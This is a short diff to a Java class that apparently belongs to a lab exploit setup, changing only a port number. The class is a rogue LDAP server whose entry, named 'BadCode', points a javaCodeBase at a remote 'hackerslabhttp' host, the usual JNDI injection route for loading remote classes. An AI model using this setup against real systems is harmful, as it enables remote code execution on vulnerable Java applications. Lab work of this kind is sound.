@@ -43,7 +43,7 @@ public class LDAPServer {
             e.addAttribute("objectClass", "top", "domain", "extensibleObject", "javaNamingReference");
             e.addAttribute("cn", "badcode");
             e.addAttribute("javaClassName", "BadCode");
-            e.addAttribute("javaCodeBase", "http://hackerslabhttp:8080/");
+            e.addAttribute("javaCodeBase", "http://hackerslabhttp:8081/");
             e.addAttribute("javaFactory", "BadCode");
             ds.add(e);
             
